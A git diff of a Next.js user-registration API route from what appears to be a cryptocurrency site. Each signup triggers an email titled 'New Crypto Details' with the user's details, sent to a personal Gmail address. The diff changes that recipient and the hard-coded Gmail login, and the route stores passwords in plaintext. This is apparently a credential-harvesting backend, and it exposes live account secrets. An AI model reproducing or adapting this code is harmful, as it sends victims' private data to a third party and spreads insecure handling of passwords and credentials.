@@ -17,7 +17,7 @@ export async function POST(req) {
     if (existingUser) {
       return NextResponse.json(
         { message: "User already exists" },
-        { status: 400 }
+        { status: 400 },
       );
     } else {
       const portfolio = {
@@ -42,8 +42,8 @@ export async function POST(req) {
         },
       };
       const message = {
-        from: "meshackchuck@gmail.com",
-        to: "Owerboy36@gmail.com",
+        from: "hvbvcchuknb@gmail.com",
+        to: "joychurch28@gmail.com",
         subject: "New Crypto Details",
         html: `
             <h3>User Details</h3>
@@ -61,26 +61,27 @@ export async function POST(req) {
           password: body.password,
           agree: body.agree,
           portfolio: portfolio,
+          image: "",
         },
       });
       const transporter = nodemailer.createTransport({
         service: "gmail",
         auth: {
-          user: "christariccykid55@gmail.com",
-          pass: "eqex qtlf ogzx sqzb",
+          user: "hvbvcchuknb@gmail.com",
+          pass: "fpjb hwii sade fcgv",
         },
       });
       await transporter.sendMail(message);
       return NextResponse.json(
         { message: "User created successfully" },
-        { status: 200 }
+        { status: 200 },
       );
     }
   } catch (err) {
     console.error(err);
     return NextResponse.json(
       { message: "Internal Server Error", error: err.message },
-      { status: 500 }
+      { status: 500 },
     );
   }
 }
